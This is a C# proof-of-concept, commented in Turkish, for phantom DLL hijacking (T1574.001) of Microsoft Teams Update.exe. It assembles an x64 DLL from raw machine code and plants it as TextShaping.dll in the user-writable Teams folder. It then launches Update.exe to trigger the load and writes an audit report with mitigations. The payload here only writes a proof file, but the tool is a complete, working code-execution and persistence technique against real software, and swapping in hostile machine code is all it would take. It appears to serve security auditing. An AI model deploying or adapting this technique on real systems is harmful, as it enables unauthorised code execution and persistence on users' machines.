using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

// TeamsUpdateDllHijackProbe v4 — T1574.001 Phantom DLL Hijacking
// Hedef: Microsoft Teams — AppData\Local\Microsoft\Teams\Update.exe
//        TextShaping.dll bu dizinde aranir ama mevcut degildir (phantom).
//        Dizin kullanici tarafindan yazilabilirdir (non-admin yeterli).
//
// Bagimsiz — DLL payload PE'si runtime'da ic olarak uretilir.
// Ek dosya gerekmez. Sadece bu exe calistirilir.
//
// C# 5 / .NET 4.x uyumlu

// ─────────────────────────────────────────────────────────────────────────────
//  PE BUILDER — hardcoded x64 DllMain + import table
//  Layout:
//    TEXT_RVA  = 0x1000 (128 byte DllMain)
//    RDATA_RVA = 0x2000 (IDT + ILT + IAT + HintName + strings)
//
//  RDATA ichindeki RVA'lar:
//    IDT_OFF  = 0x000   ILT_RVA   = 0x2028
//    ILT_OFF  = 0x028   IAT_RVA   = 0x2048
//    IAT_OFF  = 0x048   DLL_NAME  = 0x2090
//    HN_OFF   = 0x068   PATH_RVA  = 0x209E
//                        TEXT_RVA  = 0x20C4   PROOF_LEN = 132
//
//  IAT sirasi:  [0]=CreateFileA@0x2048, [1]=WriteFile@0x2050, [2]=CloseHandle@0x2058
// ─────────────────────────────────────────────────────────────────────────────

class PhantomDllHijackProbe
{
    const string DLL_TARGET = "TextShaping.dll";
    const string PROOF_FILE = @"C:\Users\Public\phantom_dll_proof.txt"; // DLL PE'sine islenip degistirilemez

    static string LOG_FILE     = null;  // Main'de EXE dizinine gore set edilir
    static string exeDir       = null;  // EXE'nin bulundugu klasor
    static string tempDllPath  = null;  // uretilen DLL (temizlenecek)
    static string deployedPath = null;  // hedef deploy (temizlenecek)

    // ── x64 DllMain makine kodu (128 byte) ───────────────────────────────────
    static readonly byte[] TEXT_CODE = new byte[]
    {
        // push rbp/rbx/rdi ; sub rsp,0x20
        0x55, 0x53, 0x57, 0x48, 0x83, 0xEC, 0x20,
        // cmp edx,1 ; jnz +103 (.done = offset 0x73)
        0x83, 0xFA, 0x01, 0x75, 0x67,
        // lea rcx,[rip+0x108B] → PATH_RVA 0x209E  (from RIP=0x1013)
        0x48, 0x8D, 0x0D, 0x8B, 0x10, 0x00, 0x00,
        // mov edx,0x40000000 (GENERIC_WRITE)
        0xBA, 0x00, 0x00, 0x00, 0x40,
        // xor r8d,r8d ; xor r9d,r9d
        0x45, 0x33, 0xC0, 0x45, 0x33, 0xC9,
        // mov dword[rsp+32],2 (CREATE_ALWAYS)
        0xC7, 0x44, 0x24, 0x20, 0x02, 0x00, 0x00, 0x00,
        // mov dword[rsp+40],0x80 (FILE_ATTRIBUTE_NORMAL)
        0xC7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00,
        // mov qword[rsp+48],0
        0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00,
        // call [rip+0x100B] → CreateFileA IAT 0x2048  (from RIP=0x103D)
        0xFF, 0x15, 0x0B, 0x10, 0x00, 0x00,
        // cmp rax,-1 ; je +48 (.done)
        0x48, 0x83, 0xF8, 0xFF, 0x74, 0x30,
        // mov rdi,rax ; mov rcx,rdi
        0x48, 0x89, 0xC7, 0x48, 0x89, 0xF9,
        // lea rdx,[rip+0x1074] → TEXT_DATA_RVA 0x20C4  (from RIP=0x1050)
        0x48, 0x8D, 0x15, 0x74, 0x10, 0x00, 0x00,
        // mov r8d,132 (PROOF_LEN)
        0x41, 0xB8, 0x84, 0x00, 0x00, 0x00,
        // lea r9,[rsp+4]
        0x4C, 0x8D, 0x4C, 0x24, 0x04,
        // mov qword[rsp+32],0 (lpOverlapped)
        0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,
        // call [rip+0xFE6] → WriteFile IAT 0x2050  (from RIP=0x106A)
        0xFF, 0x15, 0xE6, 0x0F, 0x00, 0x00,
        // mov rcx,rdi
        0x48, 0x89, 0xF9,
        // call [rip+0xFE5] → CloseHandle IAT 0x2058  (from RIP=0x1073)
        0xFF, 0x15, 0xE5, 0x0F, 0x00, 0x00,
        // .done: mov eax,1 ; add rsp,0x20 ; pop rdi/rbx/rbp ; ret
        0xB8, 0x01, 0x00, 0x00, 0x00,
        0x48, 0x83, 0xC4, 0x20,
        0x5F, 0x5B, 0x5D, 0xC3
    };

    static byte[] BuildRdata()
    {
        using (var ms = new MemoryStream())
        {
            // IDT[0]: OrigFirstThunk ILT=0x2028, TS=0, FC=0, Name=0x2090, FirstThunk IAT=0x2048
            W32(ms, 0x2028); W32(ms, 0); W32(ms, 0); W32(ms, 0x2090); W32(ms, 0x2048);
            // IDT null terminator
            ms.Write(new byte[20], 0, 20);
            // ILT (QWORD per entry + null)
            W64(ms, 0x2068); W64(ms, 0x2076); W64(ms, 0x2082); W64(ms, 0);
            // IAT (same as ILT; loader overwrites at runtime)
            W64(ms, 0x2068); W64(ms, 0x2076); W64(ms, 0x2082); W64(ms, 0);
            // Hint/Name: hint(2) + name + null, padded to even
            // CreateFileA: 14 bytes (hint=0, "CreateFileA\0")
            ms.Write(new byte[] { 0,0, 0x43,0x72,0x65,0x61,0x74,0x65,0x46,0x69,0x6C,0x65,0x41,0 }, 0, 14);
            // WriteFile: 12 bytes
            ms.Write(new byte[] { 0,0, 0x57,0x72,0x69,0x74,0x65,0x46,0x69,0x6C,0x65,0 }, 0, 12);
            // CloseHandle: 14 bytes
            ms.Write(new byte[] { 0,0, 0x43,0x6C,0x6F,0x73,0x65,0x48,0x61,0x6E,0x64,0x6C,0x65,0 }, 0, 14);
            // KERNEL32.dll\0\0 — 14 bytes (pad to even)
            ms.Write(new byte[] { 0x4B,0x45,0x52,0x4E,0x45,0x4C,0x33,0x32,0x2E,0x64,0x6C,0x6C,0,0 }, 0, 14);
            // proof_path (38 bytes: "C:\Windows\Temp\phantom_dll_proof.txt\0")
            byte[] pp = Encoding.ASCII.GetBytes("C:\\Users\\Public\\phantom_dll_proof.txt\x00");
            ms.Write(pp, 0, pp.Length);
            // proof_text (132 bytes)
            byte[] pt = Encoding.ASCII.GetBytes(
                "=== PHANTOM DLL HIJACKING - AUDIT KANITI ===\r\n" +
                "MITRE ATT&CK: T1574.001\r\n" +
                "Teknik: Phantom DLL Hijacking (WindowsApps/TextShaping.dll)\r\n");
            ms.Write(pt, 0, pt.Length);
            return ms.ToArray();
        }
    }

    static byte[] BuildProofDll()
    {
        const long IMAGE_BASE = 0x180000000L;
        const int  FILE_ALIGN = 0x200;
        const int  SECT_ALIGN = 0x1000;
        const int  TEXT_RVA   = 0x1000;
        const int  RDATA_RVA  = 0x2000;
        const int  TEXT_RAW   = 0x200;
        const int  RDATA_RAW  = 0x400;

        byte[] tc    = TEXT_CODE;
        byte[] rdata = BuildRdata();
        int trsz  = AlignUp(tc.Length,    FILE_ALIGN);
        int rrsz  = AlignUp(rdata.Length, FILE_ALIGN);
        int imgSz = AlignUp(RDATA_RVA + AlignUp(rdata.Length, SECT_ALIGN), SECT_ALIGN);

        byte[] pe = new byte[RDATA_RAW + rrsz];

        // ── DOS header ────────────────────────────────────────────────────────
        pe[0] = 0x4D; pe[1] = 0x5A;      // MZ
        W32(pe, 0x3C, 0x40);             // e_lfanew → 0x40

        // ── PE signature ──────────────────────────────────────────────────────
        W32(pe, 0x40, 0x4550);           // "PE\0\0"

        // ── COFF header (at 0x44, 20 bytes) ──────────────────────────────────
        W16(pe, 0x44, 0x8664);           // Machine = AMD64
        W16(pe, 0x46, 2);               // NumberOfSections
                                        // 0x48-0x53: zeros (TS, PtrSym, NumSym)
        W16(pe, 0x54, 240);             // SizeOfOptionalHeader
        W16(pe, 0x56, 0x2022);          // Characteristics: EXE|LARGE_ADDR|DLL

        // ── Optional header (PE32+, at 0x58, 240 bytes) ───────────────────────
        W16(pe, 0x58, 0x020B);          // Magic PE32+
        W32(pe, 0x5C, trsz);            // SizeOfCode
        W32(pe, 0x60, rrsz);            // SizeOfInitializedData
        W32(pe, 0x68, TEXT_RVA);        // AddressOfEntryPoint (= DllMain)
        W32(pe, 0x6C, TEXT_RVA);        // BaseOfCode
        W64(pe, 0x70, IMAGE_BASE);      // ImageBase
        W32(pe, 0x78, SECT_ALIGN);      // SectionAlignment
        W32(pe, 0x7C, FILE_ALIGN);      // FileAlignment
        W16(pe, 0x80, 6);              // MajorOperatingSystemVersion
        W16(pe, 0x88, 6);              // MajorSubsystemVersion
        W32(pe, 0x90, imgSz);           // SizeOfImage
        W32(pe, 0x94, 0x200);           // SizeOfHeaders
        W16(pe, 0x9C, 3);              // Subsystem = Console
        W16(pe, 0x9E, 0x0100);         // DllCharacteristics = NX_COMPAT
        W64(pe, 0xA0, 0x100000L);       // SizeOfStackReserve
        W64(pe, 0xA8, 0x1000L);         // SizeOfStackCommit
        W64(pe, 0xB0, 0x100000L);       // SizeOfHeapReserve
        W64(pe, 0xB8, 0x1000L);         // SizeOfHeapCommit
        W32(pe, 0xC4, 16);              // NumberOfRvaAndSizes

        // Data directories (base = 0xC8)
        // [1] Import Directory at 0xD0
        W32(pe, 0xD0, RDATA_RVA);       // IDT RVA (= .rdata start)
        W32(pe, 0xD4, 40);              // IDT size (2 entries * 20)
        // [12] IAT at 0x128 (0xC8 + 12*8)
        W32(pe, 0x128, 0x2048);         // IAT RVA
        W32(pe, 0x12C, 32);             // IAT size (4 * 8)

        // ── Section headers (at 0x148) ────────────────────────────────────────
        // .text
        byte[] sn1 = Encoding.ASCII.GetBytes(".text\x00\x00\x00");
        Array.Copy(sn1, 0, pe, 0x148, 8);
        W32(pe, 0x150, tc.Length);      // VirtualSize
        W32(pe, 0x154, TEXT_RVA);       // VirtualAddress
        W32(pe, 0x158, trsz);           // SizeOfRawData
        W32(pe, 0x15C, TEXT_RAW);       // PointerToRawData
        W32(pe, 0x16C, 0x60000020);     // Characteristics: CODE|EXEC|READ

        // .rdata
        byte[] sn2 = Encoding.ASCII.GetBytes(".rdata\x00\x00");
        Array.Copy(sn2, 0, pe, 0x170, 8);
        W32(pe, 0x178, rdata.Length);   // VirtualSize
        W32(pe, 0x17C, RDATA_RVA);      // VirtualAddress
        W32(pe, 0x180, rrsz);           // SizeOfRawData
        W32(pe, 0x184, RDATA_RAW);      // PointerToRawData
        W32(pe, 0x194, 0x40000040);     // Characteristics: IDATA|READ

        // ── Section data ─────────────────────────────────────────────────────
        Array.Copy(tc,    0, pe, TEXT_RAW,  tc.Length);
        Array.Copy(rdata, 0, pe, RDATA_RAW, rdata.Length);

        return pe;
    }

    // Little-endian write helpers
    static void W16(byte[] b, int o, int v)  { b[o]=(byte)v; b[o+1]=(byte)(v>>8); }
    static void W32(byte[] b, int o, int v)  { b[o]=(byte)v; b[o+1]=(byte)(v>>8); b[o+2]=(byte)(v>>16); b[o+3]=(byte)(v>>24); }
    static void W32(byte[] b, int o, uint v) { W32(b,o,(int)v); }
    static void W64(byte[] b, int o, long v) { W32(b,o,(int)v); W32(b,o+4,(int)(v>>32)); }
    static void W32(MemoryStream m, uint v)  { m.WriteByte((byte)v); m.WriteByte((byte)(v>>8)); m.WriteByte((byte)(v>>16)); m.WriteByte((byte)(v>>24)); }
    static void W64(MemoryStream m, ulong v) { W32(m,(uint)v); W32(m,(uint)(v>>32)); }
    static int  AlignUp(int n, int a)        { return (n+a-1)&~(a-1); }

    // ── Yardimci ─────────────────────────────────────────────────────────────

    static void Log(string msg)
    {
        string line = "[" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "] " + msg;
        Console.WriteLine(line);
        try { File.AppendAllText(LOG_FILE, line + Environment.NewLine); } catch { }
    }

    static bool IsWritable(string dir)
    {
        try
        {
            string t = Path.Combine(dir, "__probe_" + Guid.NewGuid().ToString("N") + ".tmp");
            File.WriteAllText(t, "x"); File.Delete(t); return true;
        }
        catch { return false; }
    }

    static void Cleanup()
    {
        foreach (string p in new string[] { deployedPath, tempDllPath })
        {
            if (p != null && File.Exists(p))
            {
                try { File.Delete(p); Log("Silindi: " + p); }
                catch (Exception ex) { Log("Silme hatasi: " + p + " — " + ex.Message); }
            }
        }
    }

    // ── Main ─────────────────────────────────────────────────────────────────

    static void Main(string[] args)
    {
        exeDir   = AppDomain.CurrentDomain.BaseDirectory.TrimEnd('\\', '/');
        LOG_FILE = Path.Combine(exeDir, "phantom_dll_log.txt");

        Console.Title = "TeamsUpdateDllHijackProbe v4 - T1574.001 Audit";
        Console.WriteLine("============================================================");
        Console.WriteLine("  T1574.001 — Teams Update.exe Phantom DLL Hijacking");
        Console.WriteLine("  Hedef    : AppData\\Local\\Microsoft\\Teams\\Update.exe");
        Console.WriteLine("  Aranan   : " + DLL_TARGET + " (phantom — dizinde mevcut degil)");
        Console.WriteLine("  Kanit    : " + PROOF_FILE);
        Console.WriteLine("  Log      : " + LOG_FILE);
        Console.WriteLine("============================================================");
        Console.WriteLine();

        // 1. Payload DLL'i hafizada uret
        Console.WriteLine("[*] Payload DLL uretiliyor...");
        byte[] dllBytes = BuildProofDll();
        tempDllPath = Path.Combine(Path.GetTempPath(),
                          "TextShapingProof_" + Guid.NewGuid().ToString("N") + ".dll");
        File.WriteAllBytes(tempDllPath, dllBytes);
        Log("Payload DLL uretildi: " + tempDllPath + " (" + dllBytes.Length + " bytes)");

        // 2. Teams dizinini belirle
        string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string teamsDir = Path.Combine(localApp, "Microsoft", "Teams");
        string updateExe = Path.Combine(teamsDir, "Update.exe");
        Log("Teams dizini: " + teamsDir);

        // 3. Dizin var mi?
        Console.WriteLine("\n--- TEAMS DIZIN KONTROL ---");
        if (!Directory.Exists(teamsDir))
        {
            Log("HATA: Teams dizini bulunamadi: " + teamsDir);
            Console.WriteLine("[!] Microsoft Teams bu makinede yuklu degil.");
            Console.ReadKey(); Cleanup(); return;
        }
        Console.WriteLine("  [OK] Teams dizini mevcut  : " + teamsDir);
        Console.WriteLine("  " + (File.Exists(updateExe) ? "[OK] Update.exe mevcut  : " : "[!] Update.exe YOK      : ") + updateExe);

        // 4. Phantom kontrol — TextShaping.dll Teams dizininde olmamali
        deployedPath = Path.Combine(teamsDir, DLL_TARGET);
        if (File.Exists(deployedPath))
        {
            Log("HATA: " + deployedPath + " zaten mevcut — phantom senaryosu gecersiz.");
            Console.WriteLine("[!] DLL zaten var, test gecersiz.");
            Console.ReadKey(); Cleanup(); return;
        }
        Console.WriteLine("  [+] " + DLL_TARGET + " Teams dizininde YOK — Phantom senaryosu GECERLI.");

        // 5. Yazilabilir mi?
        if (!IsWritable(teamsDir))
        {
            Log("HATA: Teams dizini yazilabilir degil: " + teamsDir);
            Console.WriteLine("[!] Dizin yazilabilir degil.");
            Console.ReadKey(); Cleanup(); return;
        }
        Console.WriteLine("  [+] Dizin yazilabilir — non-admin yeterli.");

        // 6. Sistem DLL kontrolu (bilgi amacli)
        Console.WriteLine("\n--- SISTEM DIZIN KONTROL ---");
        string[] sysChk = {
            Environment.GetFolderPath(Environment.SpecialFolder.System),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "SysWOW64"),
            Environment.GetFolderPath(Environment.SpecialFolder.Windows)
        };
        bool isPhantom = true;
        foreach (string d in sysChk)
        {
            string full = Path.Combine(d, DLL_TARGET);
            bool ex = File.Exists(full);
            if (ex) isPhantom = false;
            Console.WriteLine("  " + (ex ? "[MEVCUT] " : "[YOK]    ") + full);
        }
        Console.WriteLine(isPhantom
            ? "  [+] Sistem dizinlerinde de YOK — tam phantom."
            : "  [-] Sistem dizininde mevcut ama Teams dizini oncelikli aranir.");

        // 7. Ozet + onay
        Console.WriteLine("\n--- ISLEM OZETI ---");
        Console.WriteLine("  Deploy  : " + deployedPath);
        Console.WriteLine("  Kanit   : " + PROOF_FILE);
        Console.WriteLine("  Tetikle : Update.exe (otomatik) veya Teams'i elle ac");
        Console.WriteLine("  Temizlik: Otomatik");
        Console.Write("\nDevam? (E/H): ");
        string c = Console.ReadLine();
        if (c == null || c.Trim().ToUpper() != "E") { Log("Iptal."); Cleanup(); return; }

        // 8. DLL deploy
        try
        {
            File.Copy(tempDllPath, deployedPath, false);
            Log("Deploy edildi: " + deployedPath + " (" + new FileInfo(deployedPath).Length + " bytes)");
        }
        catch (Exception ex) { Log("Deploy hatasi: " + ex.Message); Cleanup(); Console.ReadKey(); return; }

        // 9. Tetikle: Update.exe --processStart Teams.exe
        if (File.Exists(updateExe))
        {
            Log("Tetikleniyor: " + updateExe);
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName  = updateExe;
                psi.Arguments = "--processStart Teams.exe";
                psi.UseShellExecute = true;
                using (Process p = Process.Start(psi))
                    Log("PID: " + (p != null ? p.Id.ToString() : "?"));
            }
            catch (Exception ex) { Log("Tetikleme hatasi: " + ex.Message); }
        }
        else
        {
            Console.WriteLine("\n[*] Update.exe bulunamadi — Teams'i elle ac veya oturumu yeniden basla.");
        }

        // 10. Kanit bekle (120 sn — Teams acilisi biraz uzun surebilir)
        Console.WriteLine();
        Log("Kanit bekleniyor: " + PROOF_FILE + " (max 120s)");
        bool found = false;
        for (int i = 1; i <= 120; i++)
        {
            if (File.Exists(PROOF_FILE)) { found = true; break; }
            Console.Write("\r  Bekleniyor... " + i + "/120s");
            Thread.Sleep(1000);
        }
        Console.WriteLine();

        // 11. Sonuc
        if (found)
        {
            string dllProof  = File.ReadAllText(PROOF_FILE);
            string compName  = Environment.MachineName;
            string userName  = Environment.UserName;
            string domain    = Environment.UserDomainName;
            string osVer     = Environment.OSVersion.ToString();
            string probeExe  = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string auditTime = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

            bool isAdmin = false;
            try
            {
                var id = System.Security.Principal.WindowsIdentity.GetCurrent();
                isAdmin = new System.Security.Principal.WindowsPrincipal(id)
                    .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch { }

            string auditReport =
                "============================================================\r\n" +
                "  AUDIT RAPORU — TEAMS UPDATE.EXE PHANTOM DLL HIJACKING\r\n" +
                "  MITRE ATT&CK : T1574.001\r\n" +
                "============================================================\r\n" +
                "Tarih/Saat     : " + auditTime + "\r\n" +
                "Bilgisayar     : " + compName + "\r\n" +
                "Kullanici      : " + domain + "\\" + userName + "\r\n" +
                "Admin          : " + (isAdmin ? "EVET" : "HAYIR (non-admin ile gerceklestirildi)") + "\r\n" +
                "Isletim Sistemi: " + osVer + "\r\n" +
                "Test Araci     : " + probeExe + "\r\n" +
                "------------------------------------------------------------\r\n" +
                "Zafiyet        : Microsoft Teams Update.exe Phantom DLL Hijacking\r\n" +
                "MITRE ATT&CK   : T1574.001 (DLL Search Order Hijacking)\r\n" +
                "Hedef Uygulama : Microsoft Teams — Update.exe\r\n" +
                "Hedef DLL      : " + DLL_TARGET + "\r\n" +
                "Deploy Yolu    : " + deployedPath + "\r\n" +
                "Phantom mi     : " + (isPhantom ? "EVET — hicbir sistem dizininde mevcut degil" : "EVET — Teams dizini oncelikli aranir") + "\r\n" +
                "------------------------------------------------------------\r\n" +
                "DLL YUKLENME KANITI:\r\n" +
                dllProof.Trim() + "\r\n" +
                "------------------------------------------------------------\r\n" +
                "Sonuc          : Non-admin kullanici, kullaniciya ait ve yazilabilir\r\n" +
                "                 AppData\\Local\\Microsoft\\Teams\\ dizinine\r\n" +
                "                 " + DLL_TARGET + " birakarak Teams Update.exe\r\n" +
                "                 araciligiyla keyfi kod calistirmayi baardi.\r\n" +
                "                 Etki: Persistence (Teams startup), kod yurutme.\r\n" +
                "------------------------------------------------------------\r\n" +
                "Oneri          : AppLocker / WDAC ile kullanici dizinlerinden\r\n" +
                "                 DLL yuklenmesini kisitla.\r\n" +
                "                 Microsoft Teams icin ghost DLL fix uygula.\r\n" +
                "                 Process Mitigation: DLL load policy.\r\n" +
                "============================================================\r\n";

            string reportPath = Path.Combine(exeDir, "teams_dll_audit_report.txt");
            string localProof = Path.Combine(exeDir, "phantom_dll_proof.txt");
            try { File.WriteAllText(reportPath, auditReport); } catch { }
            try { File.Copy(PROOF_FILE, localProof, true); } catch { }

            Log("=== ZAFIYET DOGRULANDI ===");
            Log("Audit raporu  : " + reportPath);
            Log("Kanit kopyasi : " + localProof);
            Console.WriteLine();
            Console.WriteLine(auditReport);
            Console.WriteLine("[+] Dosyalar EXE klasorune kaydedildi: " + exeDir);
        }
        else
        {
            Log("Kanit dosyasi olusturulmadi (120s icinde DLL yuklenmedi).");
            Console.WriteLine("\n[?] DLL yuklenmediyse:");
            Console.WriteLine("    1. Teams gercekten Update.exe uzerinden mi acildi?");
            Console.WriteLine("    2. Teams zaten acik miydi? (Kapat, DLL'i koy, yeniden ac)");
            Console.WriteLine("    3. x86/x64 uyumu? (Update.exe 32-bit mi?)");
        }

        // 12. Temizlik ve cikis
        Cleanup();
        Log("Bitti.");
        Console.WriteLine("\nProgram 4 saniye sonra kapanacak...");
        Thread.Sleep(4000);
    }
}
